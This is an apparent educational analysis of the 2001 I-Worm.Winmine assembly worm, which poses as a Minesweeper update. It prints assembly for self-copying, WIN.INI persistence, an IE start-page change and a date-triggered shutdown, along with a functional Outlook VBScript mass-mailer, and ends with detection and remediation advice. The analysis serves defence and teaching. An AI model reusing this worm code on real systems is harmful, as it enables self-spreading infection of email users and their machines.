# Dissecting I‑Worm.Winmine: An Assembly Worm Masquerading as a Game Update 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
I‑Worm.Winmine (June 2001) is a compact 32‑bit Windows worm written in assembly that blends social engineering with legacy persistence and email propagation. It impersonates a “Winmine” (Minesweeper) update, persists via WIN.INI, drops a VBScript mass‑mailer that uses Outlook to spread, and tweaks browser settings by writing to the Internet Explorer Start Page via a dynamically‑resolved API. On a specific date, it displays a message, swaps mouse buttons, and then shuts down the system after a delay. The sample relies on permissive defaults from the era—WSH enabled, Outlook object model accessible, and legacy autorun mechanisms still honored—rather than any exploit or obfuscation.

From a defender’s perspective, Winmine is useful as a blueprint: small, readable, and packed with deterministic artifacts (file names, registry paths, strings) and API sequences that make detection straightforward and remediation precise, especially on legacy hosts or in lab archives.

## Overview of the Malware 🐛
I‑Worm.Winmine follows a simple two‑branch flow controlled by where it’s executed.

- If not running from the System directory:
  - Copies itself to %System% as `WINMINE.EXE`.
  - Persists by setting the `load=` value under the `[windows]` section of `WIN.INI` to the system copy’s path.
  - Presents a decoy MessageBox to appear legitimate, then exits.
- If running from the System directory (i.e., the persisted copy):
  - Drops `C:\ENVOIE_VBS.vbs`, a VBScript mass‑mailer that automates Outlook to send the worm as an attachment with a “work is hard” themed subject/body.
  - Sets Internet Explorer’s Start Page to a hard‑coded URL by dynamically loading `SHLWAPI.dll` and calling `SHSetValueA`.
  - On the 15th day of any month, shows a message, swaps mouse buttons, sleeps five minutes, and initiates system shutdown.

There’s no network command‑and‑control; propagation is through email via Outlook. The worm also leaves user‑visible cues (messages and homepage change) that, while noisy, serve as detection aids.

## Source Code Analysis 🔬
The binary uses a small macro (`callx`) to call imported Win32 APIs and follows a clear set of labels: VERIF (location check), COPIE (copy to system), WININI (persistence), MESSAGE (decoy), SEND/GO (drop and run VBScript), DLL/REG/FINDLL (homepage change), DATE (time‑based prank), and FIN (exit).

### Location check, copy to System, and WIN.INI persistence
```asm
; Build current EXE path and %System%\WINMINE.EXE
push 0
callx GetModuleHandleA
push 50
push offset szOrig
push eax
callx GetModuleFileNameA

push 50h
push offset szCopie
callx GetSystemDirectoryA
push offset Copie                ; "\\WINMINE.EXE"
push offset szCopie
callx lstrcat

; If not equal, copy to system and persist via WIN.INI [windows] load=
push offset szOrig
push offset szCopie
callx lstrcmp
test eax,eax
jz   SEND

push 0
push offset szCopie
push offset szOrig
callx CopyFileA

push 50
push offset szWinini
callx GetWindowsDirectoryA
push offset Winini               ; "\\WIN.INI"
push offset szWinini
callx lstrcat
push offset szWinini
push offset szCopie
push offset load                 ; "load"
push offset windows              ; "windows"
callx WritePrivateProfileStringA

push 1040h
push offset TITRE                ; Winmine branding
push offset TEXTE                ; update message
push 0
callx MessageBoxA
jmp  FIN
```
- The worm ensures its main behaviors only run from the persisted copy in the System directory. Unlike many samples that use `[windows] run=`, this one uses `load=`, a legacy field that causes programs to load at startup on 9x/ME.

### Dropping the VBScript mailer and executing it
```asm
; Create C:\ENVOIE_VBS.vbs and write the embedded script
push 0
push FILE_ATTRIBUTE_READONLY
push CREATE_NEW
push 0
push FILE_SHARE_READ
push GENERIC_WRITE
push offset vbssend              ; "C:\\ENVOIE_VBS.vbs"
callx CreateFileA
cmp  eax,-1
je   GO
mov  [FileHandle],eax
push 0
push offset octets
push VBSTAILLE
push offset vbsd
push [FileHandle]
callx WriteFile
push [FileHandle]
callx CloseHandle
GO:
  push 1
  push offset onyva              ; "wscript C:\\ENVOIE_VBS.vbs"
  callx WinExec
```
- The VBScript automates Outlook to enumerate address lists and send one email per address with `Winmine.exe` attached from the System directory. Excerpt (inert):
```vb
' ENVOIE_VBS.vbs (excerpt – safe)
On Error Resume Next
Set A = CreateObject("Outlook.Application")
Set B = A.GetNameSpace("MAPI")
For Each C In B.AddressLists
  If C.AddressEntries.Count <> 0 Then
    For D = 1 To C.AddressEntries.Count
      Set E = C.AddressEntries(D)
      Set F = A.CreateItem(0)
      F.To = E.Address
      F.Subject = "Is the work so hard ??"
      F.Body = "Relax you with the last version of <Winmine>."
      Set G = CreateObject("Scripting.FileSystemObject")
      F.Attachments.Add G.BuildPath(G.GetSpecialFolder(1), "Winmine.exe")
      F.DeleteAfterSubmit = True
      If F.To <> "" Then F.Send
    Next
  End If
Next
```
- The attachment path leverages `GetSpecialFolder(1)` (System folder), matching the system copy `WINMINE.EXE` the worm planted earlier.

### Internet Explorer Start Page modification
```asm
; Dynamically load SHLWAPI and resolve SHSetValueA to set IE Start Page
push offset dllName              ; "SHLWAPI.dll"
callx LoadLibraryA
test eax,eax
jz   DATE
mov  hdll,eax
push offset FunctionName         ; "SHSetValueA"
push hdll
callx GetProcAddress
test eax,eax
jz   DATE
mov  setvalue,eax

push 08h                         ; REG_SZ
push offset start_page           ; new homepage URL
push 01h                         ; size (unused here)/flags
push offset start_key            ; "Start Page"
push offset main_s               ; HKCU\...\Internet Explorer\Main
push HKEY_CURRENT_USER
call [setvalue]

push [hdll]
callx FreeLibrary
```
- Instead of using Advapi32 directly, the worm calls `SHSetValueA` (from `SHLWAPI.dll`) to set `HKCU\Software\Microsoft\Internet Explorer\Main\Start Page` to a hard‑coded URL. Dynamic resolution can help avoid static imports.

### Date‑based prank and shutdown
```asm
push offset SystemTime
callx GetSystemTime
cmp [SystemTime.wDay], 0Fh       ; 15th?
jne  FIN
push 40h
push offset TITRE2               ; "I‑Worm.Winmine"
push offset TEXTE2
push 0
callx MessageBoxA
push 1
callx SwapMouseButton
push 60 * 5 * 1000               ; five minutes
callx Sleep
push EWX_SHUTDOWN
callx ExitWindowsEx
```
- On the 15th day, the worm displays a message, swaps mouse buttons (user annoyance), waits five minutes, and triggers a shutdown (`ExitWindowsEx` with `EWX_SHUTDOWN`).

## Mitigation and Defense Strategies 🛡️
- Constrain Windows Script Host and Outlook automation: Disable or restrict WSH (`wscript.exe/cscript.exe`) for standard users via AppLocker/WDAC, and enforce prompts or policy blocks for Outlook Object Model automation. Detect processes spawning `wscript` with on‑disk VBS droppers.
- Legacy autorun hygiene: Monitor and block changes to `WIN.INI` `[windows] load=` on supported systems. Flag binaries copying themselves into `%System%` and then writing legacy autorun entries.
- Registry and browser hardening: Enforce homepage policies for IE/legacy browsers; alert on `HKCU\Software\Microsoft\Internet Explorer\Main\Start Page` changes made by unknown processes, including those writing via `SHSetValueA`.
- Email telemetry: Identify bursts of Outlook email creation from non‑interactive contexts with identical subjects/bodies and executable attachments from `%System%`. Use Safe Attachments policies to block `.exe` attachments.
- EDR detection content: Correlate `GetSystemDirectoryA` + `CopyFileA` into `%System%` followed by `WritePrivateProfileStringA` to `WIN.INI` and a `WinExec` of `wscript`. Add coverage for `LoadLibraryA("SHLWAPI.dll")` + `GetProcAddress("SHSetValueA")` writing IE’s Start Page.
- Least privilege and allow‑listing: Running without admin limits writes to system directories and HKCU/IE settings in some environments. Use allow‑listing to prevent untrusted binaries from writing to `%System%` and from launching mail automation.
- Incident response: Remove `%System%\WINMINE.EXE`, revert `WIN.INI` `[windows] load` entries, delete `C:\ENVOIE_VBS.vbs`, restore IE Start Page policies, and review Outlook sent items/outbound logs for matching subjects. Consider user education since the lure relies on curiosity.

## Conclusion
I‑Worm.Winmine shows how a small assembly program can string together classic techniques—WIN.INI persistence, an Outlook‑based VBS mailer, and browser setting tampering—to spread under the guise of a game update. The code is direct and leaves reliable evidence: `%System%\WINMINE.EXE`, `WIN.INI` load entries, `C:\ENVOIE_VBS.vbs`, and SHLWAPI‑mediated registry writes. Modern environments neutralize much of this behavior with hardened scripting, email client protections, and policy‑enforced homepages. For legacy systems or archival analysis, the deterministic indicators and API chains above offer clear paths for detection, containment, and cleanup.
